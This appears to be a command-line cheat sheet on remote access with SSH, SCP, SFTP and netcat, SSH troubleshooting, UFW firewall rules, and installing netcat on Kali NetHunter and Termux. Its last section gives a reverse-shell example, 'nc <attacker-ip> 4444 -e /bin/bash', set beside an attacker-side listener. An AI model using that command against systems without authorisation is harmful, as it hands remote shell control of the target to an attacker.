# Accessing a Remote System via IP Address & CLI

## 1. Connecting to a Remote System Using an IP Address

### a) Secure Shell (SSH) - Best for CLI Access

#### **Service**: OpenSSH

#### **Command:**
```bash
ssh user@remote-ip
```
#### **Example:**
```bash
ssh root@192.168.1.100
```

#### **Install in Linux:**
```bash
sudo apt install openssh-client  # Client
sudo apt install openssh-server  # Server (if you want to allow connections)
```

#### **Install in Termux:**
```bash
pkg install openssh
ssh user@remote-ip
```

### b) Secure Copy (SCP) - Best for File Transfer

#### **Command:**
```bash
scp file.txt user@remote-ip:/path/to/destination
```
#### **Example:**
```bash
scp myfile.txt root@192.168.1.100:/home/root/
```

#### **Install in Linux/Termux:**
```bash
sudo apt install openssh
pkg install openssh  # Termux
```

### c) File Transfer Protocol (FTP) or Secure FTP (SFTP)

#### **Command:**
```bash
sftp user@remote-ip
```
#### **Example:**
```bash
sftp root@192.168.1.100
put file.txt
get file.txt
```

#### **Install:**
```bash
sudo apt install openssh-client  # Linux
pkg install openssh  # Termux
```

### d) Netcat (nc) - Best for Raw Data Transfer

#### **To receive data (on remote system):**
```bash
nc -l -p 1234 > receivedfile.txt
```

#### **To send data (on local system):**
```bash
cat myfile.txt | nc remote-ip 1234
```

#### **Install:**
```bash
sudo apt install netcat
pkg install netcat
```

## 2. Best Services for Command Line Access

- **SSH (Secure Shell)** – Best for secure remote access.
- **Telnet** – Unsecure, use SSH instead.
- **FTP/SFTP** – For file transfer.
- **Netcat (nc)** – For direct data transfer.
- **Mosh** – Mobile-friendly alternative to SSH.
- **Tmate** – Instant terminal sharing.

---

# Troubleshooting SSH Connection Issues

## 1. Check IP Address or Hostname

Ensure a valid IP address/hostname:
```bash
ssh user@192.168.1.100
```
Check IP reachability:
```bash
ping 192.168.1.100
```

## 2. Check SSH Service on Remote System

### **For Linux Remote System:**
```bash
sudo systemctl status ssh
sudo systemctl start ssh
sudo systemctl enable ssh
```

### **For Termux (Android):**
```bash
pkg install openssh
sshd
ps aux | grep ssh
```

## 3. Check Firewall Rules & Port

Check if SSH port is open:
```bash
nc -zv 192.168.1.100 22
```

Open port if blocked:
```bash
sudo ufw allow 22/tcp
sudo systemctl restart ssh
```
For Termux SSH (default port 8022):
```bash
sshd -p 8022
ssh user@192.168.1.100 -p 8022
```

## 4. Check /etc/hosts File

Edit:
```bash
sudo nano /etc/hosts
```
Add:
```bash
192.168.1.100   myserver
```
Test:
```bash
ssh user@myserver
```

## 5. Debug SSH Connection

Run SSH in debug mode:
```bash
ssh -vvv user@192.168.1.100
```

## 6. Alternative Connection Methods

Test using Netcat:
```bash
nc -l -p 2222
```
```bash
echo "hello" | nc 192.168.1.100 2222
```

Test using Telnet:
```bash
telnet 192.168.1.100 22
```

---

# Installing & Configuring UFW (Uncomplicated Firewall) in Linux

## 1. Install UFW

### **For Debian/Ubuntu/Parrot OS/Kali Linux:**
```bash
sudo apt update
sudo apt install ufw -y
```

### **For Arch Linux/Manjaro:**
```bash
sudo pacman -S ufw
```

### **For RHEL/CentOS:**
```bash
sudo yum install ufw
```

## 2. Enable & Start UFW
```bash
sudo ufw enable
sudo ufw status verbose
```

## 3. Allow SSH & Other Services
```bash
sudo ufw allow 22/tcp
sudo ufw allow 8022/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
```

## 4. Check Active Firewall Rules
```bash
sudo ufw status numbered
```

## 5. Delete a Rule
```bash
sudo ufw delete [rule-number]
```

## 6. Disable or Reset UFW
```bash
sudo ufw disable
sudo ufw reset
```

## 7. Reload UFW (After Changes)
```bash
sudo ufw reload
```

---

# Installing Netcat (nc) in Kali NetHunter

## 1. Check if Netcat is Installed
```bash
nc -h
which nc
```

## 2. Install Netcat in Kali NetHunter

### **Traditional Netcat (Supports -e for Reverse Shells)**
```bash
sudo apt update
sudo apt install netcat-traditional -y
```

### **OpenBSD Netcat (More Secure, No -e Option)**
```bash
sudo apt update
sudo apt install netcat-openbsd -y
```

## 3. Install Netcat in Termux (If Using NetHunter Rootless)
```bash
pkg update
pkg install netcat
```

## 4. Netcat Usage Examples

### **Start a Listener on Port 4444**
```bash
nc -lvp 4444
```

### **Connect to a Listener**
```bash
nc <remote-ip> 4444
```

### **Send a File Over Netcat**
```bash
nc -w 3 192.168.1.100 4444 < myfile.txt
```
On receiver:
```bash
nc -lvp 4444 > received.txt
```

### **Reverse Shell (Requires netcat-traditional)**
On attacker machine:
```bash
nc -lvp 4444
```
On target machine:
```bash
nc <attacker-ip> 4444 -e /bin/bash
```

## 5. Uninstall Netcat
```bash
sudo apt remove --purge netcat-traditional -y
sudo apt remove --purge netcat-openbsd -y
```


